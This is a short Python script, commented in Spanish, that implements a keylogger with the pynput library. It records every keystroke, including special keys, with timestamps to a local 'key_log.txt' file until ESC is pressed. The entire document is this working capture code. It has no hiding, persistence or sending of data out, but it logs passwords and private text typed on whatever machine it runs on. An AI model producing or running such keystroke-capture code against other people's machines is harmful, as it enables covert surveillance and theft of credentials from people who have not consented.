#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import pynput
from pynput.keyboard import Key, Listener
import logging
from datetime import datetime

# Configuración del registro de teclas
# Se guarda en un archivo con la fecha y hora actual
log_dir = ""
logging.basicConfig(
    filename=(log_dir + "key_log.txt"),
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    """
    Función que se ejecuta cada vez que se presiona una tecla.
    Registra la tecla presionada en el archivo de log.
    """
    try:
        # Registra la tecla presionada como carácter
        logging.info('Tecla {0} presionada'.format(key.char))
    except AttributeError:
        # Si la tecla no tiene carácter asociado (como ctrl, alt, etc.)
        logging.info('Tecla especial {0} presionada'.format(key))

def on_release(key):
    """
    Función que se ejecuta cada vez que se suelta una tecla.
    Se usa principalmente para detener el keylogger.
    """
    # Si se presiona la tecla ESC, se detiene el keylogger
    if key == Key.esc:
        return False

def main():
    """
    Función principal que inicia el listener de teclado.
    """
    # Crea un listener para el teclado
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()